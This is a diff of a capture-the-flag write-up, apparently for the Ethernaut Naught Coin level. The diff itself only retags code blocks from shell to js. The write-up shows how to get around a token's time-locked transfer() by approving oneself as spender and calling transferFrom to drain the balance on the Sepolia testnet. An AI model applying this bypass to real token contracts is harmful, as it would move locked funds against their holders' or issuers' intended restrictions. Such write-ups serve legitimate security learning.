@@ -89,7 +89,7 @@ In this example, we can transfer our balance to another address with the `transf
 
 First in first, check our balance.
 
-```shell
+```js
 (await contract.balanceOf(player)).toString()
 '1000000000000000000000000'
 ```
@@ -104,24 +104,24 @@ Let's look at the amount which spender is still allowed to withdraw from player.
 
 In this turn, we have defined us as a `_spender` of 10000000000000000000000000 tokens with approve() function. See transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xee4d5333cc4c60ddde903a5c938c01c705b34632224f36b6979b5b445fb1e34e)
 
-```shell
+```js
 await contract.approve(player, "1000000000000000000000000")
 ```
 
-```shell
+```js
 (await contract.allowance(player, player)).toString()
 '1000000000000000000000000'
 ```
 
 In the final step, we transfer all balance to my ex address as a **spender role**. So, we don't attached the require statement. See transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xe31cef4e74fa793caf8cda4c87b1341d0be88ff0df35137057fc8f1cbd4db4d2)
 
-```shell
+```js
 await contract.transferFrom(player,"0x80aCA4707d5A7B83B6Df80155ee46179AE678d2e","1000000000000000000000000")
 ```
 
 And, we have set the balance to zero. In other words, we have passed the challenge!
 
-```shell
+```js
 (await contract.balanceOf(player)).toString()
 '0'
 ```
